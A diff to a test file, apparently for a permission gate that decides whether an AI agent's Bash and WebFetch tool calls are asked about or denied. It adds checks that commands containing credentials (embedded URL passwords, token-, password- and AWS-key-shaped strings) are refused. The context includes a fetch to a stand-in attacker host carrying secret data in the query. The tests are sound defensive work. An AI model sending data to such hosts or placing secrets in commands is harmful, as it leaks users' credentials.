@@ -112,6 +112,11 @@ describe('decideToolUse', () => {
     expect(decide('Bash', { command: 'echo 1\nls -l' })).toMatchObject({ decision: 'ask', summary: 'Run command: echo 1 ls -l' })
   })
 
+  it('refuses to ask about a command that contains a secret of the new shapes', () => {
+    for (const command of [`git clone https://u:p@example.com/r.git`, `echo ghp_${'a1B2c3D4e5'.repeat(4)}`, 'mysql --password hunter2', 'export AWS=AKIAIOSFODNN7EXAMPLE'])
+      expect(decide('Bash', { command })).toEqual(deny('not_reviewable'))
+  })
+
   it('shows the whole URL query and refuses credentials in the URL', () => {
     expect(decide('WebFetch', { url: 'https://evil.example/c?d=SECRETDATA' })).toMatchObject({ decision: 'ask', summary: 'Fetch https://evil.example/c?d=SECRETDATA' })
     expect(decide('WebFetch', { url: 'https://user:pw@example.com/a' })).toEqual(deny('invalid_input'))
